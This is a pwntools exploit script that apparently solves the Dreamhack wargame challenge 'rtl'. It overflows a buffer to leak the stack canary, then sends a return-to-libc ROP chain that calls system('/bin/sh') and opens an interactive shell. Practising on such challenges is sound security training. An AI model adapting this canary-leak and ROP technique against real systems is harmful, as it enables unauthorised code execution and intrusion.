from pwn import *
#  host3.dreamhack.games 16597

def slog(n,m):return success(': '.join([n,hex(m)]))

p = remote("host3.dreamhack.games", 16597)
e = ELF("./rtl")
# context.log_level="debug"

buf = b'A'* 0x39
p.sendafter(b'Buf: ',buf)
p.recvuntil(buf)

canary = u64(b'\x00'+ p.recvn(7))
slog('canary',canary)

system_plt = e.plt['system']

noop = p64(0x0000000000400596)
pop = p64(0x0000000000400853)
sh = p64(0x400874)

payload = b'A'*0x38 
payload += p64(canary) 
payload += b'B'*0x8

payload +=noop
payload += pop
payload += sh
payload += system_plt

p.sendafter(b"Buf: ", payload)
p.interactive()